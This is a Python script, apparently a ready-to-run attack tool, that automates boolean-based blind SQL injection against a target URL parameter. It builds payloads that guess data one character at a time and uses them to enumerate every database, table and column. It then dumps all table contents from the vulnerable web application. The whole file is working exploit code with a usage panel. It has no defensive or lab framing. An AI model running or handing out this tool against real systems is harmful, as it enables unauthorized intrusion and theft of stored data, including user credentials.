import requests
from pwn import *
import signal
import sys
import time
import string

def ctrl_c():
    print("\n[!] Quitinggg...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

characters = string.printable

def blind_sqli(url, parameter, query, max_length=50):
    extracted_info = ""
    p1 = log.progress("Brute Force")
    p2 = log.progress("Extracting Data")
    for position in range(1, max_length + 1):
        found = False
        for char in characters:
            payload = f"1 OR ASCII(SUBSTRING(({query}),{position},1))={ord(char)}"
            params = {parameter: payload}
            response = requests.get(url, params=params)
            if response.status_code == 200:
                extracted_info += char
                p2.status(extracted_info)
                found = True
                break

        if not found:
            if position == 1:
                print("[!] No character was valid in the first position. This may be a permissions error or an invalid query")
            else:
                print("[*] End of data or error starting at the position", position)
            break
    return extracted_info

def extractDatabaseNames(url, parameter):
    print("\n[+] Extracting Database names")
    query = "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"
    dbs = blind_sqli(url, parameter, query, max_length=150)
    print(f"\n[+] Found Databases: {dbs}")
    return dbs.split(",")

def extractTablesNames(url, parameter, db):
    print(f"\n[+] Extracting tables from the database '{db}':")
    query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'"
    tables = blind_sqli(url, parameter, query, max_length=150)
    print(f"[+] Tables in '{db}': {tables}")
    return tables.split(",")

def extractColumnsNames(url, parameter, db, table):
    print(f"\n[+] Extracting columns from the table '{table}' in the database '{db}':")
    query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'"
    columns = blind_sqli(url, parameter, query, max_length=150)
    print(f"[+] Columns in '{table}': {columns}")
    return columns.split(",")

def extractData(url, parameter, db, table, columns):
    print(f"\n[+] Extracting data from the table '{table}' in the database '{db}':")
    if columns == ['']:
        print(f"[!] No columns were found in '{table}'.")
        return
    query = f"SELECT GROUP_CONCAT(CONCAT_WS(0x3a,{','.join(columns)})) FROM {db}.{table}"
    data = blind_sqli(url, parameter, query, max_length=150)
    print(f"[+] Extracted data '{table}': {data}")
    return data

def makeSQLI(url, parameter):
    db_list = extractDatabaseNames(url, parameter)
    for db in db_list:
        table_list = extractTablesNames(url, parameter, db)
        for table in table_list:
            columns = extractColumnsNames(url, parameter, db, table)
            extractData(url, parameter, db, table, columns)

def helpPanel():
    print(f"\nUsage: python3 {sys.argv[0]} <url> [parameter]")
    print(f"Example: python3 {sys.argv[0]} http://example.com/vulnerable id")
    print(f"If the vulnerable parameter is not specified, ‘id’ will be used by default..\n")

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] in ['-h', '--help']:
        helpPanel()
        sys.exit(0)
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        helpPanel()
        sys.exit(1)

    url = sys.argv[1]
    if len(sys.argv) == 3:
        parameter = sys.argv[2]
    else:
        parameter = "id"

    makeSQLI(url, parameter)
